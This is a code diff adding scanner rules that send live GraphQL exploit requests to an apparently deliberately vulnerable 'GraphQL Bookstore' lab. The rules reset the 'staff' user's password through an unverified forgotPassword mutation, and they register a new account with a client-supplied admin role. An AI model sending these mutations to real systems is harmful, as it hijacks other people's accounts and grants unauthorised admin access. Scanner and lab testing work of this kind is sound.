@@ -64494,6 +64494,113 @@ const graphqlBookFetchExternalResourceSsrfRouteLiveOracle: Rule = async (ctx) =>
   };
 };
 
+const GRAPHQLBOOK_FORGOT_PASSWORD_TARGET = "staff";
+
+const graphqlBookForgotPasswordTakeoverLiveOracle: Rule = async (ctx) => {
+  if (!isGraphqlBookHost(ctx)) return NEGATIVE;
+  const gqlUrl = graphqlBookGqlUrl(ctx);
+  const probePass = `ThugirProbe${Date.now().toString(36)}!`;
+  const doc = await ctx.probe.get(gqlUrl, {
+    method: "POST",
+    body: JSON.stringify({
+      query: `mutation { forgotPassword(username: "${GRAPHQLBOOK_FORGOT_PASSWORD_TARGET}", newPassword: "${probePass}") { success message } }`
+    }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  let parsed: Record<string, unknown> | null = null;
+  try {
+    parsed = JSON.parse(doc.body) as Record<string, unknown>;
+  } catch {
+    return NEGATIVE;
+  }
+  const forgot = (parsed.data as { forgotPassword?: { success?: boolean; message?: string } })?.forgotPassword;
+  if (!forgot?.success || !/password reset successful/i.test(String(forgot.message ?? ""))) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: gqlUrl,
+      targetUser: GRAPHQLBOOK_FORGOT_PASSWORD_TARGET,
+      snippet: doc.body.slice(0, 220).trim(),
+      note: `GraphQL Bookstore POST /graphql forgotPassword(username:"${GRAPHQLBOOK_FORGOT_PASSWORD_TARGET}") resets another user's password without verification — broken authentication oracle (API2)`
+    }
+  };
+};
+
+const graphqlBookForgotPasswordTakeoverRouteLiveOracle: Rule = async (ctx) => {
+  if (!isGraphqlBookHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/graphql\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await graphqlBookForgotPasswordTakeoverLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "GraphQL Bookstore /graphql route scan — forgotPassword mutation resets another user's password without ownership verification — route-specific broken authentication oracle (API2)"
+    }
+  };
+};
+
+const graphqlBookRegisterAdminMassAssignmentLiveOracle: Rule = async (ctx) => {
+  if (!isGraphqlBookHost(ctx)) return NEGATIVE;
+  const gqlUrl = graphqlBookGqlUrl(ctx);
+  const username = `thugir_admin_${Date.now().toString(36)}`;
+  const doc = await ctx.probe.get(gqlUrl, {
+    method: "POST",
+    body: JSON.stringify({
+      query: `mutation { register(username: "${username}", firstName: "Thugir", lastName: "Probe", password: "Test123!", role: "admin") { success message token user { username role } } }`
+    }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  let parsed: Record<string, unknown> | null = null;
+  try {
+    parsed = JSON.parse(doc.body) as Record<string, unknown>;
+  } catch {
+    return NEGATIVE;
+  }
+  const register = (parsed.data as { register?: { success?: boolean; user?: { username?: string; role?: string } } })
+    ?.register;
+  if (!register?.success) return NEGATIVE;
+  if (String(register.user?.role ?? "").toLowerCase() !== "admin") return NEGATIVE;
+  return {
+    fired: true,
+    confidence: register.user?.username === username ? 0.94 : 0.92,
+    evidence: {
+      url: gqlUrl,
+      username: register.user?.username,
+      role: register.user?.role,
+      snippet: doc.body.slice(0, 220).trim(),
+      note: "GraphQL Bookstore POST /graphql register(role:\"admin\") creates a new account with admin role from client-supplied mass assignment — privilege escalation oracle (API3/API6)"
+    }
+  };
+};
+
+const graphqlBookRegisterAdminMassAssignmentRouteLiveOracle: Rule = async (ctx) => {
+  if (!isGraphqlBookHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/graphql\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await graphqlBookRegisterAdminMassAssignmentLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "GraphQL Bookstore /graphql route scan — register mutation accepts role:admin from client input — route-specific mass-assignment privilege escalation oracle"
+    }
+  };
+};
+
 function isGraphqlLabHost(ctx: RuleContext): boolean {
   return /graphql-lab\.vercel\.app/i.test(ctx.origin);
 }
@@ -91760,6 +91867,10 @@ export const RULES: Record<string, Rule> = {
   graphqlBookInternalUserSearchBolaRouteLiveOracle,
   graphqlBookFetchExternalResourceSsrfLiveOracle,
   graphqlBookFetchExternalResourceSsrfRouteLiveOracle,
+  graphqlBookForgotPasswordTakeoverLiveOracle,
+  graphqlBookForgotPasswordTakeoverRouteLiveOracle,
+  graphqlBookRegisterAdminMassAssignmentLiveOracle,
+  graphqlBookRegisterAdminMassAssignmentRouteLiveOracle,
   graphqlLabHasuraAdminLiveOracle,
   graphqlLabHasuraAdminRouteLiveOracle,
   dvgaMyPastesIdorLiveOracle,
